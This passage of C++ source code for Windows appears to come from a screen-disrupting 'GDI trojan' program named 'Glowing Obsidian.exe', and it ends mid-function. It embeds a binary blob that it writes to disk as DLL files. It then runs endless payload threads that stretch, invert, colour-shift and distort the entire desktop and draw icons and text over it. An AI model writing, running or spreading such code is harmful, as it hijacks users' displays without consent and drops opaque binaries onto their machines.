\x8F\x83\x83\x2C\x2C\x6E\x04\x05\x14\x87\x7E\x7E\xDA\xDA\x19\x19\x68\x68\x04\x45\x52\x04\x33\x5B\x8E\xD4\xCF\xCF\x3F\x3F\x88\x88\x4F\x4F\x79\x79\xB4\xB4\x6C\x6C\x04\x45\x16\x82\xE0\x31\x31\x04\x98\x71\x81\x38\x38\x06\xC0\x0D\x92\x84\x84\x84\x84\xE0\xE0\xB4\x26\x26\xC9\xC9\x1F\x1F\x6C\x6C\x26\x26\x6C\x6C\x04\xB4\x1B\x88\x1A\x1A\xE0\xA8\xA8\xBB\xBB\xDB\xDB\x04\x86\x38\x81\xE7\xE7\x07\x3E\x01\x83\x82\xCD\x2D\x2D\x04\x6E\x55\x04\xCA\x43\x85\x10\x10\x23\x23\x21\x21\x40\xBA\x82\x57\x41\x40\x40\x01\x04\x04\x00\x92\x21\x21\x85\x85\x0A\x0A\x38\x38\x37\x37\xE0\xE0\xDA\x9F\x9F\x5B\x5B\xA0\xA0\x04\x16\x5B\x85\xDD\xDD\x4F\x4F\xC3\xC3\x04\xB0\x27\x88\x83\xF3\xF3\xA6\xA6\x9D\x9D\xDD\xDD\x04\x44\x3D\x86\xAD\xAD\x0C\x0C\x39\x39\x4D\x04\x0D\x28\x81\x31\x31\x04\x68\x5B\x8E\x8B\x8B\x14\x14\x84\x84\xC7\xC7\x7C\x7C\xA8\xA8\xA8\xC9\xC9\x04\xA9\x3A\x81\x64\x64\x04\x80\x48\x88\xE0\xE0\x46\x46\xB3\x7E\x7E\x41\x41\x04\x40\x0B\x83\x35\x35\x56\x56\x05\x3C\x01\x87\xCD\xE2\xE2\xD4\xBB\xBB\x22\x22\x04\x7B\x3D\x40\xC2\x3C\x01\x41\x40\x40\x01\x08\x08\x00\x8A\xB8\xB8\x7B\x7B\x0F\x0F\x22\x22\xAA\x06\x06\x04\xCF\x0D\x96\xEF\xEF\xEF\xEF\xEF\xEF\xA5\xA5\xAE\xAE\xAF\xAF\xDB\xDB\xD4\x5C\x5C\x2A\x2A\x53\x53\xCD\xCD\x04\x80\x2A\x8C\x94\x94\x1C\x1C\x17\x17\xD2\x20\x20\xC1\xC1\x4F\x4F\x04\x68\x60\x8C\x8B\x8B\x09\x09\xE1\xE1\xFA\xFA\xA8\xA8\x00\xF8\xF8\x04\x8A\x33\x8E\x41\x41\xE4\xE4\x9B\x9B\xF2\xF2\xB3\xB3\x45\x45\xD4\x31\x31\x04\x51\x2E\x04\xC0\x03\x81\x56\x56\x05\x3C\x01\x05\x3D\x01\x80\x22\x04\xDB\x48\x40\xC8\x3C\x01\x41\x40\x40\x01\x08\x08\x00\x88\x15\x15\x09\x09\x7B\x06\x06\x5A\x5A\x06\xFA\x7C\x04\x67\x2A\x87\x87\x87\x58\x58\xDB\xDB\xD4\x3C\x05\x6F\x16\x81\x49\x49\x04\xED\x4A\x04\xC4\x12\x9D\xD4\xD4\x9A\xD3\xD3\x19\x19\xC8\xC8\xAA\xAA\x38\x38\x66\x66\x10\x10\xBB\xBB\xBC\xBC\xF8\xF8\xA8\xD4\xD4\x43\x43\xE2\xE2\x04\xCD\x3F\x8A\xDB\xDB\x21\x21\xD4\xD4\xCB\xCB\xD4\x24\x24\x04\x7C\x1B\x83\x7C\x7C\x2D\x2D\x04\x71\x1B\x05\x3C\x01\x80\x22\x40\xD3\x3C\x01\x41\x40\x40\x01\x09\x12\x19\x04\x92\x03\x04\x50\x4D\x04\x44\x01\x04\xBC\x71\x90\x64\x64\xB9\xB9\xD4\x2A\x2A\x86\x86\x3B\x3B\x68\x68\xDD\xDD\xEE\xEE\x04\x24\x10\xA3\x71\x71\x71\xEE\xEE\x53\x53\x34\x34\x66\x66\x0B\x0B\x13\x13\x14\x14\x92\x92\x7C\x7C\x83\x83\x28\x2B\x2B\xE6\xE6\x88\x88\xE4\xE4\x5D\x5D\x84\x84\x04\x85\x0B\x86\xE2\xE2\x77\x24\x24\x1F\x1F\x04\x5E\x06\x83\xD4\xD4\x84\x84\x05\x3C\x01\x04\x3D\x01\x40\xDA\x40\x7E\x41\x40\x40\x01\x90\x00\x00\x00\x32\x32\x38\x38\x7B\x7B\xA8\xA8\x0D\x0D\x8F\x8F\xE4\xE4\x05\xC9\x22\x98\x3C\x3C\x43\x43\x3B\x3B\x3B\x3B\x17\x17\x3C\x3C\xD4\xD4\xB4\xB4\xF4\xF4\x8E\xD9\xD9\x7A\x7A\xD4\xD4\x04\x40\x1A\x8C\x14\x14\x6A\x6A\xD4\xD4\xE5\xE5\x44\x44\x8A\xBA\xBA\x04\xF4\x2C\x04\xBB\x57\x8A\x6B\x6B\x15\x15\x77\x77\xC3\xC3\xC9\xBE\xBE\x04\x2B\x65\x81\xDB\xDB\x09\x3C\x01\x40\xDE\x3D\x01\x07\x07\x00\x04\xBB\x36\x04\x19\x6E\x92\x3A\x3A\xAB\xAB\xDB\xDB\x46\x61\x61\x86\x86\xC5\xC5\x3B\x3B\x43\x43\x53\x53\x04\xD1\x21\x82\x5E\x5E\xF5\x04\xE7\x77\x90\x7E\x7E\x0E\x0E\x0F\x0F\x30\x30\x6A\x6A\x3B\x3B\x20\x20\x28\x28\xC8\x04\x3E\x1F\x89\x83\x83\xEE\xEE\xD8\xD8\x26\x26\x3D\x3D\x04\xC6\x62\x82\xFB\x7C\x7C\x04\xE1\x4A\x83\x9B\x9B\x0B\x0B\x40\xCA\xED\x09\x41\x40\x40\x01\x28\x8F\x07\xA1\x13\x13\x0F\x0F\x25\x25\x3A\x3A\xE1\x88\x88\x3C\x3C\xBF\xBF\x6D\x6D\x43\x43\x28\x28\xEE\xEE\x24\x24\x4F\x4F\xEE\xF6\xF6\xA9\xA9\xF4\xF4\x04\x00\x14\x85\x30\x30\x30\x30\x33\x33\x04\xD3\x0E\x80\x6E\x06\xEB\x4F\x8C\xDE\xDE\x4A\x4A\x3E\x3E\xBE\xBE\xFB\xFB\xF5\xF5\xAC\x40\xC8\xE5\x0E\x41\x40\x40\x01\x3A\x44\x01\x8C\x70\x70\x6A\x37\x37\x6C\x6C\x46\x46\x8A\x8A\x19\x19\x04\x76\x62\x84\x56\x56\x4F\x4F\x4F\x04\x60\x24\x83\x5E\x5E\x25\x25\x04\x40\x06\x81\x13\x13\x04\xC9\x40\x95\xDA\xDA\xC8\x88\x88\xC1\xC1\x83\x83\x6C\x6C\x64\x64\xCC\xCC\xF4\xF4\x67\x67\x92\x92\x0C\x40\xFA\x3C\x01\x41\x40\x40\x01\x0B\x44\x01\x81\x0F\x0F\x04\xEF\x54\x81\xFA\xFA\x04\xC8\x03\x88\x44\x44\x63\x63\x83\x83\xC0\xD8\xD8\x04\x27\x06\x04\x40\x38\x04\x80\x1B\x04\x8C\x20\x88\xDA\xDA\xB3\xB3\xB3\xC8\xC8\x48\x48\x04\xC4\x2B\x04\xE9\x72\x83\x36\x36\x09\x09\x40\xFF\x3C\x01\x41\x40\x40\x01\x0D\x4B\x06\x04\x44\x01\x8E\xF4\xF4\x88\x88\x57\x57\x82\x82\xC0\x87\x87\xFE\xFE\xDA\xDA\x04\x40\x01\x8A\x1C\x1C\x23\x23\x7F\x7F\x41\x41\x6C\x6C\xBC\x04\xF2\x0E\x83\xDA\xDA\x5A\x5A\x04\xC1\x0C\x83\x59\x59\xB7\xB7\x41\x05\x3D\x01\x41\x40\x40\x01\x11\x44\x01\x86\xE0\xE0\xDA\xDA\xD1\xFE\xFE\x04\x87\x1B\x04\xC0\x3A\x92\x66\x66\x59\x59\x78\x78\x2E\x2E\x58\x58\x55\xE0\xE0\x84\x84\x37\x37\x5A\x5A\x04\x6B\x75\x40\xB8\x14\x6F\x41\x40\x40\x01\x40\x64\x44\x01\x8C\x6A\x6A\xB1\xE4\xE4\x5B\x5B\xAE\xAE\x51\x51\x0E\x0E\x04\x2F\x01\x90\x4A\x4A\x1B\x1B\x6C\x6C\x8F\xAA\xAA\x22\x22\x85\x85\x5A\x5A\x6A\x6A\x41\x12\x3C\x01\x41\x40\x40\x01\x0E\x44\x01\x86\x42\x3A\x3A\xB1\xB1\x31\x31\x04\xEE\x76\x04\xEE\x12\x04\x4B\x20\x04\x8C\x16\x80\x38\x04\xFC\x45\x41\x1A\x3C\x01\x41\x40\x40\x01\x0D\x53\x0B\x86\x42\x42\x42\x42\x0F\x0F\x0F\x05\x32\x7D\x86\x25\x25\x92\x92\xF1\xF1\x38\x04\x08\x3B\x41\x22\x3E\x01\x41\x40\x40\x01\x0B\xC7\x03\x83\x40\x40\x29\x29\x04\x45\x28\x81\x85\x85\x41\x26\xB9\x03\x10\x44\x01\x87\x65\x65\x29\x29\x08\x08\x01\x01\x41\x32\x3C\x01\x41\x40\x40\x01\x41\x34\x70\x02\x40\xE2\xE2\x00\x85\x01\x01\x02\x02\x02\x02\x04\x04\x00\x08\x08\x00\x10\x10\x00\x20\x20\x00\x40\x40\x40\x00\x40\x64\x64\x00\x41\x40\x40\x01\x40\x5A\x3E\x01\x87\x03\x03\x07\x07\x03\x03\x03\x03\x04\x04\x00\x08\x08\x00\x10\x10\x00\x20\x20\x00\x06\x06\x00\x0A\x48\x00\x09\x0A\x00\x13\x13\x00\x06\x09\x00\x04\x06\x00\x83\x07\x07\x07\x07\x09\x09\x00\x13\x13\x00\x0B\x13\x00\x80\x03\x13\x13\x00\x0F\x13\x00\x07\x56\x00\x0C\x5F\x00\x09\x13\x00\x81\x07\x07\x40\x58\x42\x01\x41\x3E\x40\x01\x83\x01\x01\x07\x07\x04\xFE\x23\x04\x04\x00\x08\x08\x00\x10\x10\x00\x20\x20\x00\x40\x40\x40\x00\x40\x64\x64\x00\x04\x47\x01\x40\x54\x42\x01\x41\x40\x40\x01\x40\xE8\x40\x01\x06\x42\x01\x81\x01\x01\x41\x40\x40\x01\x40\x5A\x40\x01\x80\x06\x08\x69\x00\x80\x06\x09\x0A\x00\x16\x89\x00\x1D\x20\x00\x20\x3D\x00\x26\x26\x00\x28\x48\x00\x2E\x42\x01\x41\x40\x40\x01\x40\x5E\x40\x01\x80\x05\x04\x05\x00\x84\x04\x04\x01\x01\x05\x05\x0A\x00\x1A\x87\x00\x1D\x20\x00\x04\x41\x00\x22\xCA\x00\x17\x43\x00\x0B\x3D\x00\x04\x22\x00\x26\x4C\x00\x41\x40\x40\x01\x40\x86\x40\x01\x81\x06\x06\x09\xD3\x00\x08\xDD\x00\x80\x06\x0E\x44\x03\x04\xF2\x14\x04\x04\x00\x0B\xFD\x00\x05\x0F\x00\x0E\x74\x03\x04\x04\x00\x06\x17\x00\x0B\x10\x04\x08\x28\x00\x09\x09\x00\x06\x43\x00\x09\x3D\x00\x10\xAD\x03\x80\x06\x0C\x62\x01\x0F\x26\x00\x0A\x2C\x00\x81\x06\x06\x0D\x0D\x00\x09\x21\x00\x0C\x26\x00\x0D\xA2\x00\x41\x40\x40\x01\x40\x5C\x40\x01\x82\x04\x04\x05\x04\xB3\x00\x04\x04\x00\x08\xBB\x00\x84\x04\x04\x04\x04\x04\x0A\x89\x00\x05\x0F\x00\x82\x04\x05\x05\x09\xFD\x00\x06\x11\x00\x04\x21\x00\x07\x31\x00\x0A\x41\x00\x09\x1A\x00\x0B\x37\x00\x08\x0C\x00\x05\x31\x00\x80\x05\x06\x0D\x00\x05\x23\x00\x0A\x22\x00\x06\x26\x00\x82\x05\x05\x04\x04\x05\x00\x08\x89\x00\x06\x1D\x00\x05\xB8\x01\x04\x09\x00\x0A\x93\x00\x07\x67\x00\x0B\xAD\x00\x06\x5C\x00\x04\x07\x00\x0E\x7E\x00\x07\x31\x00\x41\x40\x40\x01\x40\x63\x40\x06\x0A\xB7\x00\x06\xCC\x00\x05\xC8\x00\x0C\xD5\x03\x09\x40\x01\x0C\x19\x00\x05\x2B\x00\x0C\x40\x01\x0D\x4F\x01\x0E\x58\x00\x09\x62\x01\x09\x26\x06\x0A\xE0\x03\x09\x26\x00\x0A\x4F\x01\x08\xFF\x03\x09\x78\x00\x0E\x54\x00\x0B\x0C\x04\x07\x26\x00\x04\x8D\x00\x0A\x89\x00\x07\x17\x00\x40\x75\x40\x01\x05\x93\x02\x04\xE8\x00\x04\xDD\x00\x04\xD1\x01\x0D\xC8\x00\x0F\x40\x01\x0C\x3C\x01\x0B\xD9\x00\x0B\x37\x00\x18\x57\x01\x07\x48\x02\x15\x66\x01\x09\x1A\x03\x04\x1D\x03\x1D\x40\x01\x06\x9B\x02\x07\x8D\x00\x08\x46\x08\x06\x5A\x00\x81\x05\x05\x07\xA4\x02\x41\x40\x40\x01\x40\x5E\x40\x01\x0A\x51\x03\x05\x0A\x00\x05\x39\x01\x0C\xA9\x00\x09\xA7\x04\x06\x5C\x04\x08\x1A\x01\x04\x28\x00\x05\xB0\x04\x0A\x25\x01\x0F\xD9\x00\x08\xDE\x04\x81\x04\x04\x05\x66\x03\x06\xDD\x00\x0A\x3D\x00\x07\xD7\x07\x08\x39\x00\x07\x13\x00\x0A\x0F\x00\x06\xDD\x03\x0F\x40\x01\x1C\xA7\x01\x0C\x41\x0A\x08\x34\x08\x41\x40\x40\x01\x40\x63\x40\x01\x05\xBA\x00\x0A\x3C\x01\x07\xFA\x00\x0A\xD3\x00\x06\xEA\x00\x05\x1B\x00\x0B\x20\x00\x06\x1B\x03\x06\x0B\x00\x08\x41\x00\x09\x15\x00\x0A\x35\x0A\x0B\x32\x00\x0E\x30\x00\x09\x0C\x00\x0F\x78\x00\x0C\x8D\x00\x07\x10\x00\x0A\x6B\x07\x11\x67\x00\x0D\x82\x00\x0C\xCC\x0C\x0B\x5D\x00\x41\x40\x40\x01\x40\x61\x40\x01\x1F\xB2\x0E\x06\xA2\x05\x2F\x73\x0E\x0C\x29\x01\x40\x81\x02\x14\x41\x40\x40\x01\x41\x3E\x80\x16\x41\x40\x40\x01\x40\x5A\x40\x01\x40\xE8\x42\x01\x41\x40\x40\x01\x40\x54\x40\x01\x08\x80\x20\x82\x02\x02\x02\x0A\x07\x23\x09\x0A\x00\x13\x13\x00\x80\x02\x40\x4E\x2D\x23\x1C\x6B\x00\x26\x91\x00\x2A\xBE\x23\x83\x03\x03\x0A\x0A\x41\x40\x40\x01\x40\x58\x02\x23\x13\xAC\x22\x05\x0E\x00\x0D\x47\x22\x10\x13\x00\x40\x46\x35\x23\x40\x4A\x4A\x00\x1F\x1F\x00\x40\x56\x3E\x01\x41\x40\x40\x01\x06\x42\x01\x82\x0A\x0A\x01\x05\x05\x00\x06\x09\x00\x0A\x0A\x00\x13\x13\x00\x0A\x13\x00\x04\xC5\x2C\x83\x08\x08\x08\x08\x04\x04\x00\x08\x08\x00\x10\x10\x00\x19\x19\x00\x06\x3B\x00\x81\x01\x01\x09\x09\x00\x13\x13\x00\x0B\x13\x00\x80\x08\x0B\x13\x00\x81\x0A\x0A\x07\x84\x00\x09\x09\x00\x05\x0A\x00\x08\x0E\x00\x09\x09\x00\x0F\x13\x00\x40\x5C\x42\x29\x41\x3E\x40\x01\x43\x46\x08\x2F\x43\xA0\xA0\x03\x47\x40\x40\x07\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"

typedef union _RGBQUAD {
	COLORREF rgb;
	struct {
		BYTE r;
		BYTE g;
		BYTE b;
		BYTE Reserved;
	};
}_RGBQUAD, * PRGBQUAD;

int red, green, blue;
bool ifcolorblue = false, ifblue = false;

COLORREF fe(int length) {
	if (red != length) {
		red < length; red++;
		if (ifblue == true) {
			return RGB(red, 0, length);
		}
		else {
			return RGB(red, 0, 0);
		}
	}
	else {
		if (green != length) {
			green < length; green++;
			return RGB(length, green, 0);
		}
		else {
			if (blue != length) {
				blue < length; blue++;
				return RGB(0, length, blue);
			}
			else {
				red = 0; green = 0; blue = 0;
				ifblue = true;
			}
		}
	}
}

void icondll(int code) {
	ofstream ofs;
	ofs.open("GLOWINGOBSIDIANICON.dll", ios_base::out | ios_base::binary);
	ofs.write((char*)GLOWINGOBSIDIANICON, sizeof(GLOWINGOBSIDIANICON));
	ofs.close();
}

void icon2kdll(int code) {
	ofstream ofs;
	ofs.open("GLOWINGOBSIDIANICON2K.dll", ios_base::out | ios_base::binary);
	ofs.write((char*)GLOWINGOBSIDIANICON2K, sizeof(GLOWINGOBSIDIANICON2K));
	ofs.close();
}

DWORD WINAPI Tunnel(LPVOID lpParam) {
	for (;;) {
		HDC hdc = GetDC(0);
		int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN);
		StretchBlt(hdc, 20, 20, w - 40, h - 40, hdc, 0, 0, w, h, SRCCOPY);
		ReleaseDC(0, hdc);
		DeleteObject(hdc);
		Sleep(100);
	}
	return 0;
}

DWORD WINAPI Fangda(LPVOID lpParam) {
	for (;;) {
		HDC hdc = GetDC(0);
		int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN);
		StretchBlt(hdc, -20, -20, w + 40, h + 40, hdc, 0, 0, w, h, SRCCOPY);
		ReleaseDC(0, hdc);
		DeleteObject(hdc);
		Sleep(100);
	}
	return 0;
}

DWORD WINAPI lakuan(LPVOID lpParam) {
	for (;;) {
		HDC hdc = GetDC(0);
		int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN);
		StretchBlt(hdc, -20, 0, w + 40, h, hdc, 0, 0, w, h, SRCCOPY);
		ReleaseDC(0, hdc);
		DeleteObject(hdc);
		Sleep(25);
	}
	return 0;
}

DWORD WINAPI lagao(LPVOID lpParam) {
	for (;;) {
		HDC hdc = GetDC(0);
		int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN);
		StretchBlt(hdc, 0, -20, w, h + 40, hdc, 0, 0, w, h, SRCCOPY);
		ReleaseDC(0, hdc);
		DeleteObject(hdc);
		Sleep(25);
	}
	return 0;
}

DWORD WINAPI lazhai(LPVOID lpParam) {
	for (;;) {
		HDC hdc = GetDC(0);
		int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN);
		StretchBlt(hdc, 20, 0, w - 40, h, hdc, 0, 0, w, h, SRCCOPY);
		ReleaseDC(0, hdc);
		DeleteObject(hdc);
		Sleep(25);
	}
	return 0;
}

DWORD WINAPI ladi(LPVOID lpParam) {
	for (;;) {
		HDC hdc = GetDC(0);
		int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN);
		StretchBlt(hdc, 0, 20, w, h - 40, hdc, 0, 0, w, h, SRCCOPY);
		ReleaseDC(0, hdc);
		DeleteObject(hdc);
		Sleep(25);
	}
	return 0;
}

DWORD WINAPI mousedrawicon(LPVOID lpParam) {
	HWND hwnd = GetDesktopWindow();
	HINSTANCE hshell32 = LoadLibrary(_T("Shell32.dll"));
	HDC hdc = GetWindowDC(hwnd);
	POINT point;
	for (;;)
	{
		GetCursorPos(&point);
		DrawIcon(hdc, point.x, point.y, LoadIcon(0, IDI_ERROR));

	}
}

DWORD WINAPI drawglowingobsidianicon(LPVOID lpParam) {
	int w = GetSystemMetrics(SM_CXSCREEN);
	int h = GetSystemMetrics(SM_CYSCREEN);
	HWND hwnd = GetDesktopWindow();
	HINSTANCE GLOWINGOBSIDIANICON = LoadLibrary(_T("GLOWINGOBSIDIANICON.dll"));
	HDC hdc = GetWindowDC(hwnd);
	for (;;) {
		for (int x = 0; x <= w; x += 64) {
			for (int y = 0; y <= h; y += 64) {
				DrawIconEx(hdc, x, y, LoadIcon(GLOWINGOBSIDIANICON, MAKEINTRESOURCE(1)), 64, 64, NULL, NULL, DI_NORMAL);
			}
		}
	}
}

DWORD WINAPI drawglowingobsidianicon2k(LPVOID lpParam) {
	int w = GetSystemMetrics(SM_CXSCREEN);
	int h = GetSystemMetrics(SM_CYSCREEN);
	HWND hwnd = GetDesktopWindow();
	HINSTANCE GLOWINGOBSIDIANICON2K = LoadLibrary(_T("GLOWINGOBSIDIANICON2K.dll"));
	HDC hdc = GetWindowDC(hwnd);
	for (;;) {
		for (int x = 0; x <= w; x += 64) {
			for (int y = 0; y <= h; y += 64) {
				DrawIconEx(hdc, x, y, LoadIcon(GLOWINGOBSIDIANICON2K, MAKEINTRESOURCE(1)), 64, 64, NULL, NULL, DI_NORMAL);
			}
		}
	}
}

DWORD WINAPI mypayload4(LPVOID lpParam) {
	HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
	int sw = GetSystemMetrics(SM_CXSCREEN);
	int sh = GetSystemMetrics(SM_CYSCREEN);
	BITMAPINFO bmi = { 0 };
	PRGBQUAD rgbScreen = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = sw;
	bmi.bmiHeader.biHeight = sh;
	HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
	SelectObject(hdcMem, hbmTemp);
	for (;;) {
		hdcScreen = GetDC(0);
		BitBlt(hdcMem, 0, 0, sw, sh, hdcScreen, 0, 0, SRCCOPY);
		for (INT i = 0; i < sw * sh; i++) {
			INT x = sw - i, y = i % sw;
			rgbScreen[i].rgb += x + y;
		}
		BitBlt(hdcScreen, 0, 0, sw, sh, hdcMem, 0, 0, SRCCOPY);
		ReleaseDC(NULL, hdcScreen); DeleteDC(hdcScreen);
		Sleep(25);
	}
}

DWORD WINAPI mypayload7(LPVOID lpParam) {
	int dwStartTime = time(NULL);
	int status = 3;
	int icnNum = 32516;
	POINT p;
	p.x = 0, p.y = 0;
	for (;;) {
		int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN);
		HDC hdc = GetDC(NULL);
		LPCWSTR lpText = L"Glowing Obsidian.exe";
		SetTextColor(hdc, RGB(rand() % 255, rand() % 255, rand() % 255));
		SetBkColor(hdc, RGB(rand() % 255, rand() % 255, rand() % 255));
		TextOutW(hdc, p.x, p.y, lpText, wcslen(lpText));
		switch (status) {
		case 0: //↖
			icnNum = 32513;
			p.x -= 25;
			p.y -= 5;
			if (p.x < 0 || p.y < 0) {
				if (p.x < 0) {
					status = 1;
				}
				if (p.y < 0) {
					status = 2;
				}
			}
			break;
		case 1: //↗
			icnNum = 32514;
			p.x += 25;
			p.y -= 5;
			if (p.x >= w - 25 || p.y < 0) {
				if (p.x >= w - 25) {
					status = 0;
				}
				if (p.y < 0) {
					status = 3;
				}
			}
			break;
		case 2: //↙
			icnNum = 32515;
			p.x -= 25;
			p.y += 5;
			if (p.x < 0 || p.y >= h - 5) {
				if (p.x < 0) {
					status = 3;
				}
				if (p.y >= h - 5) {
					status = 0;
				}
			}
			break;
		case 3: //↘
			icnNum = 32516;
			if (p.x >= w - 25 && p.y >= h - 5) {
				RedrawWindow(NULL, NULL, NULL, RDW_ERASE | RDW_INVALIDATE | RDW_ALLCHILDREN);
				return 0;
			}
			p.x += 25;
			p.y += 5;
			if (p.x >= w - 25 || p.y >= h - 5) {
				if (p.x >= w - 25) {
					status = 2;
				}
				if (p.y >= h - 5) {
					status = 1;
				}
			}
			break;
		}
		Sleep(10);
	}
}

DWORD WINAPI shader3(LPVOID lpParam) {
	HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
	INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	BITMAPINFO bmi = { 0 };
	PRGBQUAD rgbScreen = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;
	HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, DIB_RGB_COLORS, (void**)&rgbScreen, NULL, NULL);
	SelectObject(hdcMem, hbmTemp);
	for (;;) {
		hdcScreen = GetDC(0);
		BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
		for (INT i = 0; i < w * h; i++) {
			INT x = i % w, y = i / w;
			rgbScreen[i].rgb += x ^ y;
		}
		BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
		ReleaseDC(NULL, hdcScreen); DeleteDC(hdcScreen);
	}
}

DWORD WINAPI Color(LPVOID lpParam) {
	HDC desk = GetDC(0);
	int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
	while (1)
	{
		desk = GetDC(0);
		SelectObject(desk, CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255)));
		PatBlt(desk, 0, 0, sw, sh, PATINVERT);
		Sleep(100);
	}
	return 0;
}

DWORD WINAPI ColorInvert(LPVOID lpParam) {
	for (;;) {
		HDC hdc = GetDC(0);
		int w = GetSystemMetrics(0), h = GetSystemMetrics(1);

		BitBlt(hdc, 0, 0, w, h, hdc, 0, 0, NOTSRCCOPY);

		ReleaseDC(0, hdc);
		DeleteObject(hdc);

		Sleep(1000);
	}
	return 0;
}

DWORD WINAPI PAYLOAD08(LPVOID lpParam) {
	int dwStartTime = time(NULL);
	for (;;) {
		int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN);
		HDC hdc = GetDC(NULL);
		HDC hcdc = CreateCompatibleDC(hdc);
		HBITMAP hBitmap = CreateCompatibleBitmap(hdc, w, h);
		SelectObject(hcdc, hBitmap);
		BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		POINT pos[3];
		pos[0].x = rand() % w, pos[0].y = rand() % h;
		pos[1].x = rand() % w, pos[1].y = rand() % h;
		pos[2].x = rand() % w, pos[2].y = rand() % h;
		PlgBlt(hcdc, pos, hcdc, 0, 0, w, h, 0, 0, 0);
		BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
		ReleaseDC(NULL, hdc);
		ReleaseDC(NULL, hcdc);
		DeleteObject(hdc);
		DeleteObject(hcdc);
		DeleteObject(hBitmap);
		Sleep(100);
	}
	RedrawWindow(NULL, NULL, NULL, RDW_ERASE | RDW_INVALIDATE | RDW_ALLCHILDREN);
	return 0;
}

DWORD WINAPI drawsquare(LPVOID lpParam) {
	int w = GetSystemMetrics(SM_CXSCREEN);
	int h = GetSystemMetrics(SM_CYSCREEN);
	HWND hwnd = GetDesktopWindow();
	HDC hdc = GetWindowDC(hwnd);
	int signX = 1;
	int signY = 1;
	int signX1 = 1;
	int signY1 = 1;
	int incrementor = 10;
	for (;;) {
		for (int x = 0; x <= w; x += 64) {
			for (int y = 0; y <= h; y += 64) {
				HBRUSH brush = CreateSolidBrush(fe(255));
				SelectObject(hdc, brush);
				Rectangle(hdc, x, y, 64 + x, 64 + y);
			}
		}
		Sleep(50);
	}
}

DWORD WINAPI mypayload6(LPVOID lpParam) {
	HINSTANCE GLOWINGOBSIDIANICON = LoadLibrary(_T("GLOWINGOBSIDIANICON.dll"));
	int dwStartTime = time(NULL);
	int status = 3;
	int icnNum = 32516;
	POINT p;
	p.x = 0, p.y = 0;
	for (;;) {
		int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN);
		HDC hdc = GetDC(NULL);
